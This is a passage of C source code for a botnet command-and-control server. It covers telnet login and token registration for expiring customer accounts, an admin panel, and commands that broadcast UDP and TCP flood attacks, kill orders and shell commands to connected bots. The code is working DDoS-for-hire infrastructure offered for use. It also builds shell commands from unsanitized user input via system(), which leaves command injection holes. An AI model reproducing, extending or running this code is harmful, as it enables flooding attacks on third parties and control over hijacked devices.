	    if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
		if(strlen(buf)>2047)close(thefd);
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		trim(buf);
		
		loadingscreenl(thefd);
		
		strcpy(iffailedp,buf);
		find_line = Search_in_File("logins.txt",nickstring);
        if(strcmp(iffailedp, accounts[find_line].password) != 0 || strcmp(iffailedu, accounts[find_line].id) != 0){find_line = -1; goto failed;}
		if(strcmp(iffailedp, accounts[find_line].password) == 0 || strcmp(iffailedu,accounts[find_line].id) == 0)
		{
		int c;
		for(c=0;c<MAXFDS;c++)
		{
		 if(!strcmp(managements[c].user, iffailedu))
		{
		char rdd[200];
		sprintf(rdd,"\r\n\x1b[1;31m[\x1b[1;37muser %s is all ready logged in by another person please try another user.\x1b[1;31m]\r\n",iffailedu);
		if(send(thefd, rdd, strlen(rdd), MSG_NOSIGNAL) == -1) goto end;
		find_line = -1;
		sleep(4);
		goto end;
		 }
		}
		
		char *ex;
		int g=0;
		char sav[100];
		strcpy(sav,accounts[find_line].date);
		char date[3][100];
		for(ex = strtok(sav,"/"); ex != NULL; ex = strtok(NULL,"/"))
		{
			if(g>3)
			break;
		strcpy(date[g],ex);
		g++;
		}
		time_t s;
		struct tm* current_time;
        s = time(NULL);
        current_time = localtime(&s);

		if(atoi(date[2]) < current_time->tm_year+1900)
		{
			datechecker(thefd,iffailedu);
			sleep(4);
			goto end;
		}
		else if(atoi(date[2]) == current_time->tm_year+1900)
		{
			if(atoi(date[1]) < current_time->tm_mon+1)
			{
				datechecker(thefd,iffailedu);
				sleep(4);
			    goto end;
			}
			else if(atoi(date[1]) == current_time->tm_mon+1)
			{
				if(atoi(date[0]) < current_time->tm_mday)
				{
					datechecker(thefd,iffailedu);
					sleep(4);
			        goto end;
				}
			}
		}
			
			
		
		strcpy(managements[thefd].user,iffailedu);
		        if(strlen(accounts[find_line].id) > 0 && !strcmp(accounts[find_line].priv, "admin"))
				{
				printf("\x1b[1;31m[\x1b[1;32m+\x1b[1;31m] \x1b[1;37mAdmin \x1b[1;31m[\x1b[1;37m%s\x1b[1;31m] \x1b[1;37mlogged in.\n",accounts[find_line].id);
				}
				else if(strlen(accounts[find_line].id) > 0)
				printf("\x1b[1;31m[\x1b[1;32m+\x1b[1;31m] \x1b[1;37mUser \x1b[1;31m[\x1b[1;37m%s\x1b[1;31m] \x1b[1;37mlogged in.\n",accounts[find_line].id);
			char su[200];
			sprintf(su,"\r\n\x1b[1;31m[\x1b[1;37msucessfully logged in\x1b[1;31m]");
		if(send(thefd, su, strlen(su), MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		}

        memset(buf, 0, 2048);
        goto fak;

		failed:
		printf("\x1b[1;31m[\x1b[1;32m+\x1b[1;31m] \x1b[1;37mfailed login atempt with cred --> %s:%s \n\x1b[1;31m[\x1b[1;32mvictems ip\x1b[1;31m] \n\x1b[1;31m[\x1b[1;32m+\x1b[1;31m] \x1b[1;37mip --> %s \n",iffailedu,iffailedp,ipl);
		char flog[1024];
		sprintf(flog,"echo \"<----------------------->\nfailed login with cred --> %s:%s \n[victems ip] \nip --> %s \n<----------------------->\" >> failed.txt",iffailedu,iffailedp,ipl);
		system(flog);
		memset(iffailedu,0,sizeof(iffailedu));
		memset(iffailedp,0,sizeof(iffailedp));
		
		char lolfuck[200];
		sprintf(lolfuck,"\r\n\x1b[1;31m[\x1b[1;37minvalid creds gtfo!\x1b[1;31m]");
        if(send(thefd, lolfuck, strlen(lolfuck), MSG_NOSIGNAL) == -1) goto end;
           sleep(2);
        goto end;
		}
	
	    if(!strcmp(buf,"register") || !strcmp(buf,"r"))
		{
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		memset(buf,0,sizeof buf);
		if(send(thefd, "\x1b[1;37mToken\x1b[1;31m: \x1b[1;37m",29,MSG_NOSIGNAL) == -1) goto end;
		if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
		
		loadingscreent(thefd);
		
		trim(buf);
		FILE *tk;
        int e=0;
        int cc;
        tk=fopen("tokens.txt", "r"); 
        while(!feof(tk)) 
        {
                cc=fgetc(tk);
                e++;
        }
        int jj=0;
        rewind(tk);
		char *tokenstr;
		int find_tk=0;
		char tun[100][1024];
		char date[100][200];
        tokenstr = ("%s", buf);
        find_tk = Search_in_File("tokens.txt",tokenstr);
		for(jj=0;jj<e;jj++) 
        {
            fscanf(tk, "%s %s", tun[jj], date[jj]);
        }
		
		if(strcmp(tun[find_tk], buf) == 0)
		{
		if(send(thefd, "\r\n\x1b[1;31m[\x1b[1;37mToken redeemed successfully\x1b[1;31m]\x1b[1;37m",54,MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		char tokrev[1024];
		sprintf(tokrev,"sed '/\\<%s\\>/d' -i tokens.txt",buf);
		system(tokrev);
		}
		else
		{
		if(send(thefd, "\r\n\x1b[1;31m[\x1b[1;37mToken is invaild\x1b[1;31m]\x1b[1;37m",45,MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		goto end;
		}
		
		tryagain:
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		memset(buf,0,sizeof(buf));
		if(send(thefd, "\x1b[1;37mnew username\x1b[1;31m: \x1b[1;37m",35,MSG_NOSIGNAL) == -1) goto end;
		if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
		trim(buf);
		char usernamee[1024];
		int find_e=0;
		strcpy(usernamee,buf);
		find_e = Search_in_File("logins.txt",usernamee);
		if(strcmp(accounts[find_e].id,usernamee) == 0)
		{
		char lol[100];
		sprintf(lol,"\x1b[1;37msorry user %s has all ready been taken try again\r\n",usernamee);
		if(send(thefd, lol,strlen(lol),MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		goto tryagain;
		}
		memset(buf,0,sizeof(buf));
		if(send(thefd, "\x1b[1;37mnew password\x1b[1;31m: \x1b[0;30m",35,MSG_NOSIGNAL) == -1) goto end;
		if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
		trim(buf);
		char passwordd[1024];
		strcpy(passwordd,buf);
		char alldone[512];
		sprintf(alldone,"\x1b[1;31m[\x1b[1;37msucessfully added login please try to login now\x1b[1;31m]\x1b[1;37m");
		if(send(thefd, alldone,strlen(alldone),MSG_NOSIGNAL) == -1) goto end;
		sleep(3);
		
		char buff[2048];
		char put[1024];
		char lineb[100];
		int gg=0;
        char chk[100];
		strcpy(chk,breakl("tail -c1 logins.txt | wc -l"));
        if(strstr(chk,"0"))strcpy(lineb,"\n");
		sprintf(put,"%s%s %s notadmin %s",lineb,usernamee,passwordd,date[find_tk]);
		sprintf(buff,"echo \"%s\" >> logins.txt",put);
		system(buff);
		memset(buff,0,sizeof(buff));
		goto login;
		}
	
	    else
		{
		if(send(thefd, "\x1b[1;31m[\x1b[1;37mwrong input please try again\x1b[1;31m]\x1b[1;37m",52,MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		goto end;
		}
		
		
		fak:
		pthread_create(&title, NULL, titleWriter, (void *)&thefd);
		char bashline[1024];
		char bashline1[1024];
		char exp[512];
		char msg[2048];
		sprintf(msg,"\x1b[37;1mTodays msg: %s\r\n",msggg);
		sprintf(exp,"\x1b[37;1maccount expires in: %s\r\n",accounts[find_line].date);
		sprintf(bashline,"\x1b[35;1m╔═\x1b[31;1m[\x1b[37;1m%s\x1b[31;1m@\x1b[37;1mシノア\x1b[31;1m] \x1b[0m\r\n",accounts[find_line].id);
		sprintf(bashline1,"\x1b[35;1m╚═══════>\x1b[0m");
		if(strlen(msggg) >= 1)
		if(send(thefd, msg, strlen(msg), MSG_NOSIGNAL) == -1) goto end;
	
		if(send(thefd, exp, strlen(exp), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, bashline, strlen(bashline), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bashline1, strlen(bashline1), MSG_NOSIGNAL) == -1) goto end;
        managements[thefd].connected = 1;
		
		if(!strcmp(accounts[find_line].priv,"admin"))
		managements[thefd].admin = 1;
	    else
		managements[thefd].admin = 0;
 
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
	    if(strstr(buf, "bots"))
		{
		joinn();
		botshow(thefd);
		}
		
		else if(strstr(buf, "addtoken"))
		{
			if(!strcmp(accounts[find_line].priv, "admin"))
			{
			tokenadd(thefd);
			}
		else
		{
         failed(thefd);
		}
		}
		
		else if (strstr(buf, "help"))
		{
			char help[28][2048];
			int i;
			sprintf(help[0],"\x1b[1;35m                             ╔════════════════════════════╗\r\n");
			sprintf(help[1],"\x1b[1;35m                             ║\x1b[1;37m         HELP MENU\x1b[1;35m          ║\r\n");
			sprintf(help[2],"\x1b[1;35m                             ╠════════════════════════════╬═══════════════════╗ \r\n");
			sprintf(help[3],"\x1b[1;35m                             ║\x1b[1;37m        Attack Cmds\x1b[1;35m         ║\x1b[1;37m        INFO\x1b[1;35m       ║\r\n");
			sprintf(help[4],"\x1b[1;35m                             ╠════════════════════════════╬═══════════════════╣\r\n");
			sprintf(help[5],"\x1b[1;35m                             ║\x1b[1;37m RU ip time\x1b[1;35m                 ║\x1b[1;37m Raw UDP Flood\x1b[1;35m     ║\r\n");
			sprintf(help[6],"\x1b[1;35m                             ║\x1b[1;37m TCP ip port time pps flags\x1b[1;35m ║\x1b[1;37m TCP Flood\x1b[1;35m         ║\r\n");
			sprintf(help[7],"\x1b[1;35m                             ║\x1b[1;37m @\x1b[1;31m[\x1b[1;37mdevice_name\x1b[1;31m]\x1b[1;35m             ║\x1b[1;37m define the device\x1b[1;35m ║\r\n");
			sprintf(help[8],"\x1b[1;35m                             ║\x1b[1;37m -\x1b[1;31m[\x1b[1;37mamount\x1b[1;31m]\x1b[1;35m                  ║\x1b[1;37m define the amount\x1b[1;35m ║\r\n");
			sprintf(help[9],"\x1b[1;35m╔════════════════════════════╬════════════════════╦═══════╬═══════════════════╝\r\n");
			sprintf(help[11],"\x1b[1;35m║\x1b[1;37m          MISC Cmds\x1b[1;35m         ║\x1b[1;37m        INFO\x1b[1;35m        ║       ║\r\n");
			sprintf(help[12],"\x1b[1;35m╠═══════════════╦════════════╩════════════════════╣       ║\r\n");
			sprintf(help[13],"\x1b[1;35m║\x1b[1;37m users on\x1b[1;35m      ║\x1b[1;37m Shows Users Connected To The C2\x1b[1;35m ║\x1b[1;36m  UwU\x1b[1;35m  ║\r\n");
			sprintf(help[14],"\x1b[1;35m║\x1b[1;37m msguser\x1b[1;35m       ║\x1b[1;37m Sends A Message Too A User\x1b[1;35m      ║\x1b[1;36m  OwO\x1b[1;35m  ║\r\n");
			sprintf(help[15],"\x1b[1;35m║\x1b[1;37m bots\x1b[1;35m          ║\x1b[1;37m Shows All Devices Connected\x1b[1;35m     ║       ║\r\n");
			sprintf(help[16],"\x1b[1;35m║\x1b[1;37m cls/clear\x1b[1;35m     ║\x1b[1;37m Clears The Screen\x1b[1;35m               ║       ║\r\n");
			sprintf(help[18],"\x1b[1;35m╚═══════════════╩════════════╦════════════════════╩═══════╬═══════════════════╗\r\n");
			sprintf(help[20],"\x1b[1;35m                             ║         \x1b[1;37mADMIN Cmds\x1b[1;35m         ║        \x1b[1;37mINFO\x1b[1;35m       ║\r\n");
			sprintf(help[21],"\x1b[1;35m                             ╠════════════════════════════╬═══════════════════╣\r\n");
			sprintf(help[22],"\x1b[1;35m                             ║\x1b[1;37m adduser\x1b[1;35m                    ║ \x1b[1;37mAdd User Too C2\x1b[1;35m   ║\r\n");
			sprintf(help[23],"\x1b[1;35m                             ║\x1b[1;37m addtoken\x1b[1;35m                   ║ \x1b[1;37mAdd Tok 4 reg sys\x1b[1;35m ║\r\n");
			sprintf(help[24],"\x1b[1;35m                             ║\x1b[1;37m kickuser\x1b[1;35m                   ║ \x1b[1;37mClose user fd\x1b[1;35m     ║\r\n");
			sprintf(help[25],"\x1b[1;35m                             ║\x1b[1;37m revuser\x1b[1;35m                    ║ \x1b[1;37mRemove User Login\x1b[1;35m ║\r\n");
		    sprintf(help[26],"\x1b[1;35m                             ║\x1b[1;37m emsg\x1b[1;35m                       ║ \x1b[1;37mEdit Todays Msg\x1b[1;35m   ║\r\n");
			sprintf(help[27],"\x1b[1;35m                             ╚════════════════════════════╩═══════════════════╝\r\n");
			for(i=0;i<28;i++)
			if(send(thefd, help[i],strlen(help[i]),MSG_NOSIGNAL) == -1) goto end;
		}
		
		else if(strstr(buf, "msguser"))
		{
			memset(buf,0,sizeof buf);
			char msgline[300];
			char msgg[300];
			char noton[512];
			char onl[512];
			char work[300];
			char bash[512];
			int g;
			int shit=0;
			sprintf(msgline,"\x1b[1;37minput user to msg\x1b[1;31m: \x1b[1;37m");
			if(send(thefd, msgline,strlen(msgline),MSG_NOSIGNAL) == -1) goto end;
			if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
		    trim(buf);
			for(g=0;g<MAXFDS;g++)
			{
			if(!strcmp(managements[g].user,buf))
			{
			memset(buf,0,sizeof buf);
			sprintf(msgg,"\x1b[1;37mmsg\x1b[1;31m: \x1b[1;37m");
			if(send(thefd, msgg,strlen(msgg),MSG_NOSIGNAL) == -1) goto end;
			if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
		    trim(buf);
			sprintf(onl,"\r\npriv msg by %s: %s\r\n",accounts[find_line].id,buf);
			if(send(g, onl,strlen(onl),MSG_NOSIGNAL) == -1) goto end;
			sprintf(bash,"\x1b[35;1m╔═\x1b[31;1m[\x1b[37;1m%s\x1b[31;1m@\x1b[37;1mシノア\x1b[31;1m] \x1b[0m\r\n",managements[g].user);
			if(send(g, bash,strlen(bash),MSG_NOSIGNAL) == -1) goto end;
			if(send(g, bashline1,strlen(bashline1),MSG_NOSIGNAL) == -1) goto end;
			shit=0;
			break;
			}
			else shit=1;
			}
			if(shit == 1)
			{
				memset(noton,0,sizeof noton);
			sprintf(noton,"user %s was not found to be online or existing.\r\n",buf);
			if(send(thefd, noton,strlen(noton),MSG_NOSIGNAL) == -1) goto end;
			}
			else{
				memset(work,0,sizeof work);
			sprintf(work,"msg was sent to %s.\r\n",managements[g].user);
			if(send(thefd, work,strlen(work),MSG_NOSIGNAL) == -1) goto end;
			}
			
		}
		
		else if(strstr(buf, "users on"))
		{
        int u;
		char loli[1024];
		char adm[1024];
        for(u=0;u<MAXFDS;u++) 
        {
			if(managements[u].connected == 1)
			{
			if(managements[u].admin == 1)strcpy(adm, "admin"); else strcpy(adm, "notadmin");
			sprintf(loli,"\x1b[1;31m<\x1b[1;37m---------------\x1b[1;31m>\r\n\x1b[1;37muser\x1b[1;31m: [\x1b[1;37m%s\x1b[1;31m] \r\n\x1b[1;37mid\x1b[1;31m: [\x1b[1;37m%d\x1b[1;31m] \r\n\x1b[1;37mprivstatus\x1b[1;31m: [\x1b[1;37m%s\x1b[1;31m] \r\n\x1b[1;31m<\x1b[1;37m---------------\x1b[1;31m>\r\n",managements[u].user,u,adm);
            if(send(thefd, loli, strlen(loli), MSG_NOSIGNAL) == -1) goto end;
			memset(loli,0,sizeof loli);
			}
        }
		}
		
		else if(strstr(buf, "kickuser"))
		{
			if(!strcmp(accounts[find_line].priv, "admin"))
			{
			char dy[200];
			char done[200];
			sprintf(dy,"\x1b[1;37menter user id\x1b[1;31m: \x1b[1;37m");
			if(send(thefd, dy,strlen(dy),MSG_NOSIGNAL) == -1) goto end;
		    memset(buf,0,sizeof(buf));
		    if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
			trim(buf);
			int fd = atoi(buf);
			if(managements[fd].admin == 1)
			{
			char fuck[200];
			sprintf(fuck,"u cant kick a admin off cnc dummy.\r\n");
			if(send(thefd, fuck,strlen(fuck),MSG_NOSIGNAL) == -1) goto end;
			}
			else{
			close(fd);
			sprintf(done,"\x1b[1;37muser \x1b[1;31m[\x1b[1;37m%s\x1b[1;31m]\x1b[1;37m has been kicked off from cnc.\r\n",managements[fd].user);
			if(send(thefd, done,strlen(done),MSG_NOSIGNAL) == -1) goto end;
			}
			}
		else
		{
		failed(thefd);
		}
			
		}
		
		else if(strstr(buf, "adduser"))
		{
		if(!strcmp(accounts[find_line].priv, "admin"))
		{
		char userprompt[512];
        buby:
		memset(buf,0,sizeof(buf));
		sprintf(userprompt,"\x1b[1;37mnew username\x1b[1;31m: \x1b[1;37m");
		if(send(thefd,userprompt,strlen(userprompt),MSG_NOSIGNAL) == -1) return;
		if(fdgets(buf, sizeof(buf), thefd) < 1) return;
		trim(buf);
		if(strlen(buf) < 1)
		{
		sprintf(userprompt,"\x1b[1;37mplease input a username not nothing lol\x1b[1;37m\r\n");
		if(send(thefd,userprompt,strlen(userprompt),MSG_NOSIGNAL) == -1) return;
		goto buby;
		}
		char usernamee[1024];
		int find_e=0;
		strcpy(usernamee,buf);
		find_e = Search_in_File("logins.txt",usernamee);
		if(strcmp(accounts[find_e].id,buf) == 0)
		{
			sprintf(userprompt,"\x1b[1;37musername all ready exist please try another username\x1b[1;37m\r\n");
			if(send(thefd,userprompt,strlen(userprompt),MSG_NOSIGNAL) == -1) return;
		goto buby;
		}
		duby:
		sprintf(userprompt,"\x1b[1;37mnew password\x1b[1;31m: \x1b[0;30m");
		if(send(thefd,userprompt,strlen(userprompt),MSG_NOSIGNAL) == -1) return;
		memset(buf,0,sizeof(buf));
		if(fdgets(buf, sizeof(buf), thefd) < 1) return;
		trim(buf);
		if(strlen(buf) < 1)
		{
		sprintf(userprompt,"\x1b[1;37mplease input a password not nothing lol\x1b[1;37m\r\n");
		if(send(thefd,userprompt,strlen(userprompt),MSG_NOSIGNAL) == -1) return;
		goto duby;
		}
		char passwordd[1024];
		strcpy(passwordd,buf);
		char admin[512];
		char adminout[100];
		sprintf(admin,"\x1b[0;0mdo u want this user to have admin priv? (y/n): ");
		if(send(thefd, admin,strlen(admin),MSG_NOSIGNAL) == -1) return;
		memset(buf,0,sizeof(buf));
		if(fdgets(buf, sizeof(buf), thefd) < 1) return;
		trim(buf);
        if(!strcmp(buf,"y"))
		strcpy(adminout,"admin");
	    else
		strcpy(adminout,"notadmin");
	
	    char date[512];
		char dateout[100];
	    sprintf(date,"expire date? (d/m/yyyy): ");
		if(send(thefd, date,strlen(date),MSG_NOSIGNAL) == -1) return;
		memset(buf,0,sizeof(buf));
		if(fdgets(buf, sizeof(buf), thefd) < 1) return;
		trim(buf);
		strcpy(dateout,buf);
	char ps[512];
	sprintf(ps,"\x1b[1;37msucessfully added login\x1b[1;37m\r\n");
		if(send(thefd, ps,strlen(ps),MSG_NOSIGNAL) == -1) return;
		char bufff[2048];
		char putt[1024];
		char lineb[100];
		char chk[100];
		strcpy(chk,breakl("tail -c1 logins.txt | wc -l"));
		memset(lineb,0,sizeof lineb);
        if(strstr(chk,"0"))strcpy(lineb,"\n");
		sprintf(putt,"%s%s %s %s %s",lineb,usernamee,passwordd,adminout,dateout);
		sprintf(bufff,"echo \"%s\" >> logins.txt",putt);
		system(bufff);
		memset(bufff,0,sizeof(bufff));
		}
		else
		{
		failed(thefd);
		}
		}
		
				else if(strstr(buf,"emsg"))
		{
		if(strcmp(accounts[find_line].priv,"admin") == 0)
		{
		char msgg[1024];
		char rmsg[1024];
		gmsg:
		sprintf(msgg,"\x1b[1;37mplease input your msg\x1b[1;31m: \x1b[1;37m");
		if(send(thefd, msgg, strlen(msgg), MSG_NOSIGNAL) == -1) goto end;
		memset(buf,0,sizeof(buf));
		if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
		trim(buf);
		if(strlen(buf) > 2047)
		{
		char errr[200];
		sprintf(errr,"u went over 2048 chars we dont want a bufferoverflow here hoe\r\n");
		if(send(thefd, errr, strlen(errr), MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		goto gmsg;
		}
		strcpy(msggg,buf);
		memset(buf,0,sizeof(buf));
		char amsg[1024];
		sprintf(amsg,"msg changed successfully!!\r\n");
		if(send(thefd, amsg, strlen(amsg), MSG_NOSIGNAL) == -1) goto end;
		
		}
		else
		{
		failed(thefd);
		}
		}
		
		else if(strstr(buf, "revuser"))
		{
		if(!strcmp(accounts[find_line].priv, "admin"))
		{
			char allow[512];
			char sys[1024];
            char printt[1024];
			memset(buf,0,sizeof(buf));
			sprintf(printt,"\x1b[1;37musername\x1b[1;31m: \x1b[1;37m");
			if(send(thefd, printt, strlen(printt), MSG_NOSIGNAL) == -1) goto end;
			if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
			trim(buf);
			sprintf(sys,"sed '/\\<%s\\>/d' -i logins.txt",buf);
			system(sys);
			sprintf(allow,"\x1b[1;37muser %s has been removed.\r\n",buf);
			if(send(thefd, allow, strlen(allow), MSG_NOSIGNAL) == -1) goto end;
		}
		else
		{
		failed(thefd);
		}
		}
		
		else if(strstr(buf, "cls") || strstr(buf, "clear"))
		{
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        }
		
		else if(strstr(buf,kill1) || strstr(buf,kill2)){
			if(strlen(buf) <= 4 && strcmp(accounts[find_line].priv, "admin"))
			failed(thefd);
		else{
			memset(encoded_data,0,sizeof(encoded_data));
			encode(buf);
			strcpy(buf,encoded_data);
		    strcat(buf,"\r\n");
			broadcast(buf, thefd, usernamez, "\0", MAXFDS);
			char killed[300];
			sprintf(killed,"attack killed successfully!!\r\n");
			if(send(thefd, killed, strlen(killed), MSG_NOSIGNAL) == -1) goto end;
		}
		}
		
		else if(strstr(buf,"shell"))
		{
			if(!strcmp(accounts[find_line].priv, "admin"))
			{
			memset(encoded_data,0,sizeof(encoded_data));
			encode(buf);
			strcpy(buf,encoded_data);
		    strcat(buf,"\r\n");
			broadcast(buf, thefd, usernamez, "\0", MAXFDS);
			}
		    else
			failed(thefd);
		}
		
                else if(strstr(buf,attackstring1) || strstr(buf,attackstring2) || strstr(buf,attackstring3))
				{
				if(strstr(buf,"."))
				{
				char sent[300];
				char *bname;
				char botn[512];
				int botc=MAXFDS;
				char buff[512];
				sprintf(sent,"\x1b[1;37mattack sent successfully!!\r\n");
				if(send(thefd, sent, strlen(sent), MSG_NOSIGNAL) == -1) goto end;
				trim(buf);
                printf("\x1b[1;31m[\x1b[1;32m+\x1b[1;31m]\x1b[1;31m [\x1b[1;37m%s\x1b[1;31m]\x1b[1;37m: \x1b[1;31m[\x1b[1;37m%s\x1b[1;31m]\n",accounts[find_line].id, buf);
                FILE *logFile;
                logFile = fopen("attacklogs.txt", "a");
                fprintf(logFile, "%s: \"%s\"\n",accounts[find_line].id, buf);
                fclose(logFile);
				if(strstr(buf,"@"))
				{
				memcpy(buff,buf,sizeof buf);
				bname = strtok(buff," ");
				removestr(buf,buff);
				removestr(bname,"@");
				strcpy(botn,bname);
				}
				if(strstr(buf,"-"))
				{
				memcpy(buff,buf,sizeof buf);
				bname = strtok(buff," ");
				removestr(buf,buff);
				removestr(bname,"-");
				botc = atoi(bname);
				}
				memset(encoded_data,0,sizeof(encoded_data));
				encode(buf);
				strcpy(buf,encoded_data);
				strcat(buf,"\r\n");
				broadcast(buf, thefd, usernamez, botn, botc);
				memset(encoded_data,0,sizeof(encoded_data));
				memset(botn,0,sizeof botn);
				}
				else{
					char inval[300];
					sprintf(inval,"invalid params.\r\n");
					if(send(thefd, inval, strlen(inval), MSG_NOSIGNAL) == -1) goto end;
				}
				memset(buf,0,sizeof buf);
				}
				
		else if(strlen(buf) > 2){
		char die[200];
		sprintf(die,"\x1b[1;37mcmd does not exist.\r\n");
		if(send(thefd, die, strlen(die), MSG_NOSIGNAL) == -1) goto end;
		}
		
		if(send(thefd, bashline, strlen(bashline), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bashline1, strlen(bashline1), MSG_NOSIGNAL) == -1) goto end;
		memset(buf, 0, sizeof buf);
        }
 
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
				managements[thefd].admin = 0;
				memset(managements[thefd].user,0,sizeof managements[thefd].user);
                close(thefd);
				if(strlen(accounts[find_line].id) > 0 && !strcmp(accounts[find_line].priv, "admin"))
				{
				printf("\x1b[1;31m[\x1b[1;32m+\x1b[1;31m] \x1b[1;37mAdmin \x1b[1;31m[\x1b[1;37m%s\x1b[1;31m] \x1b[1;37mlogged off.\n",accounts[find_line].id);
				}
				else if(strlen(accounts[find_line].id) > 0)
				printf("\x1b[1;31m[\x1b[1;32m+\x1b[1;31m] \x1b[1;37mUser \x1b[1;31m[\x1b[1;37m%s\x1b[1;31m] \x1b[1;37mlogged off.\n",accounts[find_line].id);
}
 
void *telnetListener(void *portt)
{
        int sockfd, newsockfd, ye=1;
		int port = *(int*)portt;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
		if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &ye, sizeof(int)) < 0)// so we can keep using same port if its in TIME_WAIT state.
        printf("setsockopt failed\n");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
				struct iplogger loli;
			   loli.socket = newsockfd;
			   char tt[100];
			   sprintf(tt,"%d.%d.%d.%d",cli_addr.sin_addr.s_addr & 255, cli_addr.sin_addr.s_addr >>8 & 255, cli_addr.sin_addr.s_addr >>16 & 255, cli_addr.sin_addr.s_addr >>24 & 255);
		       strcpy(loli.ipi,tt);
                pthread_t thread;
                pthread_create( &thread, NULL, telnetWorker, (void *)&loli);
        }
}
 
int main (int argc, char *argv[])
{
	system("ulimit -n 999999");
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
 
        int s,threads;
		threads = threadss;
        struct epoll_event event;
 
        if (argc < 3)
        {
                fprintf (stderr, "Usage: %s [bot-port] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
		int port = atoi(argv[2]);
 
        listenFD = create_and_bind (argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort ();
 
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort ();
 
        s = listen (listenFD, SOMAXCONN); // listen with a huge backlog, die if we can't
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
 
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
 
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
 
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
 
        pthread_create(&thread[0], NULL, telnetListener, (void *)&port);
 
        while(1)
        {
                broadcast("\r\n", -1, "pinger", "\0", -1);// ping bots every 60 sec on the main thread
 
                sleep(60);
        }
 
        close (listenFD);
 
        return EXIT_SUCCESS;
}
